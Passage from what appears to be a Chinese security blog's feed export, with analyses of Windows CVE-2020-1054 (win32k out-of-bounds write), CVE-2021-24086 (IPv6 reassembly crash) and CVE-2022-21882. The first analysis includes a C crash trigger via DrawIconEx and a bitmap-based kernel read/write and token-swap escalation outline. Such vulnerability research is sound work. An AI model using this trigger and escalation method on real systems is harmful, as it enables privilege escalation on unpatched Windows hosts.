##include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    HDC r0 <span class="token operator">=</span> <span class="token function">CreateCompatibleDC</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建与指定设备兼容的内存设备上下文环境</span>
    HBITMAP r1 <span class="token operator">=</span> <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x9f42</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建与指定设备环境相关的设备兼容位图</span>
    <span class="token comment">//HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);//创建与指定设备环境相关的设备兼容位图</span>
    <span class="token function">SelectObject</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> r1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//选择一对象到指定的设备上下文环境中，该对象替换先前的相同类型对象</span>
    <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>HICON<span class="token punctuation">)</span><span class="token number">0x30000010003</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0xfffffffffebffffc</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>CreateCompatibleBitmap</strong></p>
<p>创建与指定设备上下文关联的设备兼容位图</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">HBITMAP <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> HDC hdc<span class="token punctuation">,</span> <span class="token comment">//设备上下文的句柄</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cx<span class="token punctuation">,</span>  <span class="token comment">//位图宽度</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cy   <span class="token comment">//位图高度</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>DrawIconEx</strong></p>
<p>将图标和光标绘制到指定设备上下文中，执行指定光栅操作，指定拉伸或压缩图标光标。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">BOOL <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HDC    hdc<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    xLeft<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    yTop<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HICON  hIcon<span class="token punctuation">,</span><span class="token comment">//绘制图标和光标的句柄</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cxWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑宽度</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cyWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑高度</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   istepIfAniCur<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">,</span> optional<span class="token punctuation">]</span> HBRUSH hbrFlickerFreeDraw<span class="token punctuation">,</span>
  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   diFlags
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>崩溃地址为win32k!vStrWrite01+0x36a</p>
<h3 id="vStrWrite01"><a href="#vStrWrite01" class="headerlink" title="vStrWrite01"></a>vStrWrite01</h3><p>StrWrite01(struct _STRRUN *prun, struct _XRUNLEN *a2, struct SURFACE *pSurf, struct _CLIPOBJ *a4)</p>
<pre class="line-numbers language-none"><code class="language-none">OID vStrWrite01(STRRUN  *prun, 
                 XRUNLEN *pxrlEnd,
                 SURFACE *pSurf,
                 CLIPOBJ *pco)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><pre class="line-numbers language-none"><code class="language-none">typedef struct _XRUNLEN
{
    LONG    xPos;
    LONG    cRun;
    LONG    aul[1];
} XRUNLEN;
 
typedef struct _STRRUN
{
    LONG    yPos;
    LONG    cRep;
    XRUNLEN xrl;
} STRRUN;
 
 
typedef struct tagSIZE {
    LONG cx;
    LONG cy;
} SIZE,*PSIZE,*LPSIZE;
  
typedef SIZE SIZEL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>BASEOBJECT结构体</p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct _BASEOBJECT64{
  ULONG64 hHmgr;     // 0x00
  ULONG32 ulShareCount;      // 0x08
  WORD cExclusiveLock;       // 0x0A
  WORD BaseFlags;        // 0x0C
  ULONG64 Tid;           // 0x10
} BASEOBJECT64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SURFOBJ结构体</p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct _SURFOBJ64{
  BASEOBJECT64 baseObj;    // 0x00
  ULONG64 dhsurf;         // 0x18
  ULONG64 hsurf;          // 0x20
  ULONG64 dhpdev;         // 0x28
  ULONG64 hdev;           // 0x30
  SIZEL sizlBitmap;       // 0x38
  ULONG64 cjBits;         // 0x40
  ULONG64 pvBits;         // 0x48
  ULONG64 pvScan0;        // 0x50
  ULONG32 lDelta;         // 0x58
  ULONG32 iUniq;          // 0x5C
  ULONG32 iBitmapFormat;  // 0x60
  USHORT iType;           // 0x64
  USHORT fjBitmap;        // 0x66
} SURFOBJ64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>pvScan01指向Pixel Data数据区，这些数据可以通过GetBitmapBits和SetBitmapBits控制</p>
<p>sizlBitmap是两个Dword，包含位图的高度和宽度。</p>
<h3 id="触发地点"><a href="#触发地点" class="headerlink" title="触发地点"></a>触发地点</h3><p>崩溃地址为win32k!vStrWrite01+0x36a，<code>mov esi,[r14]</code></p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160100705.png"></p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824113228498.png"></p>
<pre class="line-numbers language-none"><code class="language-none">.text:FFFFF97FFF0A2175                 lea     r14, [rcx+rax*4]
.text:FFFFF97FFF0A2179                 test    ebx, ebx
.text:FFFFF97FFF0A217B                 js      short loc_FFFFF97FFF0A2192
.text:FFFFF97FFF0A217D                 mov     rax, [rsp+0A8h+arg_10]
.text:FFFFF97FFF0A2185                 cmp     ebx, [rax+38h]
.text:FFFFF97FFF0A2188                 jge     short loc_FFFFF97FFF0A2192
.text:FFFFF97FFF0A218A                 mov     esi, [r14]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>内存地址由rcx和rax决定。</p>
<h3 id="vStrWrite01流程"><a href="#vStrWrite01流程" class="headerlink" title="vStrWrite01流程"></a>vStrWrite01流程</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824145835155.png"></p>
<p>loc_FFFFF97FFF0A20B4</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824172844847.png"></p>
<p>用rcx和rax计算r14的内存地址，之后执行mov esi,[r14]指令。</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824150841161.png"></p>
<p>如果r14地址合法，对读到的值进行or或者and运算，并把运算后的值赋值回r14指向的内存地址。</p>
<p>如果控制了崩溃处的destAddr(越界地址oobAddr),就可以进行内存破坏。</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824161532452.png"></p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160327694.png"></p>
<p>之后对rcx进行操作，判断r11d是否为0，不为0跳转到loc_FFFFF97FFF0A212B，进行r11d减1操作。</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824165106838.png"></p>
<p>函数流程如下</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">do</span> <span class="token punctuation">{</span>
		<span class="token comment">/* 
		lea  r14, [rcx + rax * 4] 
		rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0
		rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5
		*/</span>
		r14 <span class="token operator">=</span> rcx <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>prun<span class="token operator">-&gt;</span>xrl<span class="token operator">-&gt;</span>xPos <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取时的oobAddr,rcx + rax * 4</span>
		<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
		tmp <span class="token operator">=</span> <span class="token operator">*</span>destAddr  <span class="token comment">//崩溃</span>

		<span class="token keyword">do</span> <span class="token punctuation">{</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
				tmp <span class="token operator">|=</span> xxxxxx
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span> <span class="token punctuation">{</span>
				tmp <span class="token operator">&amp;=</span> xxxxxx
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>r11d<span class="token punctuation">)</span>
            <span class="token operator">--</span>r11d<span class="token punctuation">;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
				<span class="token operator">*</span>destAddr <span class="token operator">=</span> tmp<span class="token punctuation">;</span> <span class="token comment">//满足条件，写入oobAddr</span>
			<span class="token punctuation">}</span>
	<span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
        
		<span class="token comment">/*
		add rcx, rax
        rcx = rcx + pSurf-&gt;lDelta
        */</span>
		rcx <span class="token operator">+=</span> pSurf<span class="token operator">-&gt;</span>lDelta<span class="token punctuation">;</span><span class="token comment">//每次循环obbAddr会增加</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对r14指向的内存进行读写</p>
<pre class="line-numbers language-none"><code class="language-none">rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0
rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5
lea  r14, [rcx+rax*4]
rcx = rcx + pSurf-&gt;lDelta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>循环的操作如下</p>
<pre class="line-numbers language-none"><code class="language-none">for(i = 0; i&lt;prun-&gt;yPos; i++)
{
    r14 = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0 + 4*(prun-&gt;xrl-&gt;xPos) + i*pSurf-&gt;lDelta
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>崩溃时的指令是<code>mov esi, [r14]</code>，由于引用无效的内存发生，是越界写入漏洞。崩溃时访问的地址能通过oob控制其中的内容。影响读写oobAddr的值有<code>prun-&gt;yPos</code>，<code>pSurf-&gt;lDelta</code>，<code>prun-&gt;xrl-&gt;xPos</code>和循环次数</p>
<pre class="line-numbers language-none"><code class="language-none">DrawIconEx(exploit_dc, 0x0, 0x0, (HICON)0x40000010003, 0x0, 0xffe00000, 0x0, 0x0, 0x1);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>yPos有DrawIconEx中的arg3和arg有关</p>
<pre class="line-numbers language-none"><code class="language-none">##include&lt;stdio.h&gt;
int main(){
    int arg3 = 0xb;
    int arg6 = 0xffe00000;
    int yPos = 0;
    int remainder_count = 0;
    int quotient_count = 0;
    int mod_num = (arg3+1-(arg6+arg3+1)) % 0x20;
    int div_num = (arg3+1-(arg6+arg3+1))/ 0x20;
    if(0xf+mod_num&gt;=0x20){
        remainder_count = mod_num;
        quotient_count = div_num+1;
        yPos = (remainder_count-1-1)*(div_num+1) \
              + div_num +arg6 + arg3+1;
    }else{
        remainder_count = mod_num;
        quotient_count = div_num;
        yPos = (0x20-1-1)*div_num+arg6+arg3+1;
    }
    printf("arg3: 0x%x\n",arg3);
    printf("arg6: 0x%x\n",arg6);
    printf("yPos First: 0x%x\n",yPos);
    printf("yPos Second: 0x%x\n",(yPos+quotient_count));
    return 0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>prun -&gt; xrl.xPos:0x900</p>
<p>pSurf-&gt;lDelta:0xa2a0</p>
<p>prun-&gt;xPos:0xb</p>
<h3 id="地址任意读写"><a href="#地址任意读写" class="headerlink" title="地址任意读写"></a>地址任意读写</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906100016677.png"></p>
<p>SIZEL sizlBitmap，是限定位图的长宽的，存储Pixel Data的长宽大小，四字节写可修改Pixel Data的大小</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095832694.png"></p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>CreateCompatibleBitmap申请VulBITMAP，并获得VulBITMAP的内核地址<br>计算oob读写地址<br>在oob读地址处申请BITMAP1，在oob写处申请BITMAP2，大小为0x7000<br>触发漏洞，读取BITMAP1中的sIzlBitmap值，修改BITMAP2对象的sizlBitmap值，对BITMAP2使用SetBitmapBits和GetBitmapBits越界读写BITMAP3的pvScan0<br>BITMAP2作为Manager，BITMAP3作为worker，实现任意读写，替换token等提权</p>
<p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220906095502566.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-24086 TCPIP拒绝服务漏洞分析</title>
    <url>/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h2><p>Windows IPv6协议栈存在的一处拒绝服务漏洞，漏洞的根本原因是IPv6的嵌套分片机制中，当尝试递归重组嵌套的分片时会计算内部有效载荷中包含的所有扩展标头，当重组扩展头约为0xffff字节的数据包时，tcpip!IPv6ReassembleDatagram中发生的NULL指针解引用发生崩溃。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>漏洞是在tcpip!Ipv6pReassembleDatagram函数中，向rax中写入数据时导致崩溃。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108162657004.png"></p>
<h3 id="tcpip-Ipv6pReassembleDatagram"><a href="#tcpip-Ipv6pReassembleDatagram" class="headerlink" title="tcpip!Ipv6pReassembleDatagram"></a>tcpip!Ipv6pReassembleDatagram</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108144319506.png"></p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108150549114.png"></p>
<h3 id="NdisGetDataBuffer"><a href="#NdisGetDataBuffer" class="headerlink" title="NdisGetDataBuffer"></a>NdisGetDataBuffer</h3><pre class="line-numbers language-none"><code class="language-none">NDIS_EXPORTED_ROUTINE PVOID NdisGetDataBuffer(
  [in]           NET_BUFFER *NetBuffer,    //指向NET_BUFFER的指针
  [in]           ULONG      BytesNeeded,   //请求的数据的连续的字节数
  [in, optional] PVOID      Storage,       //指向缓冲区的指针;如果调用方未提供任何缓冲区，则为 NULL 。 缓冲区的大小必须大于或等于 BytesNeeded 中指定的字节数。 如果此值不是 NULL，并且请求的数据不是连续的，则 NDIS 会将请求的数据复制到 存储 指示的区域。  
  [in]           ULONG      AlignMultiple, //幂对齐
  [in]           ULONG      AlignOffset    //对齐倍数的偏移量
);

NdisGetDataBuffer 返回指向连续数据的开头的指针，或者返回 NULL。
如果 NetBuffer 参数指向的 NET_BUFFER 结构中NET_BUFFER_DATA结构的 DataLength 成员小于 BytesNeeded 参数中的值，则返回值为 NULL。
如果缓冲区中请求的数据是连续的，则返回值是指向 NDIS 提供的位置的指针。 如果数据不连续，NDIS 使用 存储 参数，如下所示：
如果 Storage 参数为非 NULL，则 NDIS 会将数据复制到 存储中的缓冲区。 返回值是传递给 Storage 参数的指针。
如果 Storage 参数为 NULL，则返回值为 NULL。
由于无法映射数据缓冲区的低资源条件，返回值也可能为 NULL 。 即使数据连续或存储参数为非 NULL，也可能发生这种情况。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>NdisGetDataBuffer函数返回数据指针或者NULL，rax是NdisGetDataBuffer函数的返回值，当赋值为0，之后赋值数据没有判断是否是空指针，就会导致异常。</p>
<h3 id="ndis-NdisGetDataBuffer"><a href="#ndis-NdisGetDataBuffer" class="headerlink" title="ndis!NdisGetDataBuffer"></a>ndis!NdisGetDataBuffer</h3><p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221108152123775.png"></p>
<p>NetBuffer-&gt;DataLength小于传进来的第二个参数BytesNeeded就会返回0。</p>
<h3 id="tcpip-NetioRetreatNetBuffer"><a href="#tcpip-NetioRetreatNetBuffer" class="headerlink" title="tcpip!NetioRetreatNetBuffer"></a>tcpip!NetioRetreatNetBuffer</h3><p>在调用ndis!NdisGetDataBuffer之前调用了tcpip!NetioRetreatNetBuffer函数</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109102806617.png"></p>
<p>函数调用之前，NET_BUFFER-&gt;CurrentMdlOffset还没有设置，会调用NdisRetreatNetBufferDataStart函数设置NET_BUFFER结构。</p>
<p>NdisRetreatNetBufferDataStart会把NET_BUFFER-&gt;DataLength设置为0x10,函数返回0</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105241377.png"></p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109105650123.png"></p>
<p>a2 BytesNeeded是v3+0x28，v3是a2偏移0x68，a2是Ipv6pReceiveFragment函数中由IppCreateInReassemblySet生成，满足条件后才会调用tcpip!Ipv6pReassembleDatagram进行重组。</p>
<h3 id="Ipv6pReceiveFragment"><a href="#Ipv6pReceiveFragment" class="headerlink" title="Ipv6pReceiveFragment"></a>Ipv6pReceiveFragment</h3><p>Ipv6pReceiveFragment函数作用是处理分片，当最后一个分片校验通过，就会调用tcpip!Ipv6pReassembleDatagram函数进行重组。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109110612827.png"></p>
<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>攻击机：kali2022<br>靶机：win10专业版1709（16299.125）</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164353456.png"></p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221107164441542.png"></p>
<p>NdisGetDataBuffer有返回NULL的情况，可以使NET_BUFFER为NULL，NdisGetDataBuffer会返回NULL，就会触发BSOD空指针引用。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109113544500.png"></p>
<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>Ipv6pReassembleDatagram增加了判断，当重组数据包options_data_length和fragment_sum_length和大于0xFFFF会调用IppDeleteFromReassmblySet函数删除这个包的信息，跳过重组。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140212506.png"></p>
<p>在NetioRetreaNetBuffer函数调用处将第二个参数长度变成32位，避免后续调用NdisGetDataBuffer参数不一致。</p>
<p><img src="/2023/02/06/CVE-2021-24086%20TCPIP%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20221109140232843.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-21882 Win32K本地提权分析</title>
    <url>/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="0x00漏洞描述"><a href="#0x00漏洞描述" class="headerlink" title="0x00漏洞描述"></a>0x00漏洞描述</h2><p>CVE-2022-21882漏洞是window系统的一个本地提权漏洞，微软在2022年1月份安全更新中修补了此漏洞。CVE-2022-21882是对CVE-2021-1732漏洞的绕过，属于win32k驱动程序中的类型混淆漏洞。漏洞成因与CVE-2021-1732类似，主要因为win32kfull!xxxClientAllocExtraBytes函数会回调用户空间中的user32!xxxClientAllocWindowClassExtraBytes,使用NtUserConsoleControl方法设置tagWNDK对象的ConsoleWindow标志，修改窗口类型。回调之后，系统不检查窗口类型是否改变，攻击者可以设置目标窗口的ExtraBytes指针为任意值，修改寻址方式为桌面堆+偏移，以实现桌面堆的越界写。</p>
<p>影响版本：</p>
<pre class="line-numbers language-none"><code class="language-none">Windows 10 Version 21H2 for x64-based Systems
Windows 10 Version 21H2 for ARM64-based Systems
Windows 10 Version 21H2 for 32-bit Systems
Windows 11 for ARM64-based Systems
Windows 11 for x64-based Systems
Windows Server, version 20H2 (Server Core Installation)
Windows 10 Version 20H2 for ARM64-based Systems
Windows 10 Version 20H2 for 32-bit Systems
Windows 10 Version 21H1 for ARM64-based Systems
Windows 10 Version 21H1 for x64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows Server 2019 (Server Core installation)
Windows Server 2019
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
Windows 10 Version 20H2 for x64-based Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows Server 2022 (Server Core installation)
Windows Server 2022
Windows 10 Version 21H1 for 32-bit Systems<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><h3 id="CVE-2021-1732补丁"><a href="#CVE-2021-1732补丁" class="headerlink" title="CVE-2021-1732补丁"></a>CVE-2021-1732补丁</h3><p>CVE-2021-1732的补丁是在CreateWindowEx在调用ClientAllocWindowClassExtraBytes后增加了一个检查。正常情况下在新创建一个窗口还没有调用xxxClientAllocWindowClassExtraBytes的时候，其窗口对应的tagWND -&gt; ExtraBytes是空的，通过检测目标窗口的ExtraBytes指针是否在回调过程中被修改，推测用户态回调是否被hook，如果检查到非正常修改就会释放新创建的窗口，返回失败。也就是说CVE-2021-1732的补丁打在CreateWindowEx，修复方法是在调用xxxClientAllocWindowClassExtraBytes函数后，在CreateWindowEx中判断漏洞是否被利用。</p>
<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815112448042.png"></p>
<p>但是xxxCreateAllocWindowClassExtraBytes函数并没有做任何修改。打完补丁之后，又出现的新的路径来触发xxxClientAllocWindowClassExtraBytes函数。</p>
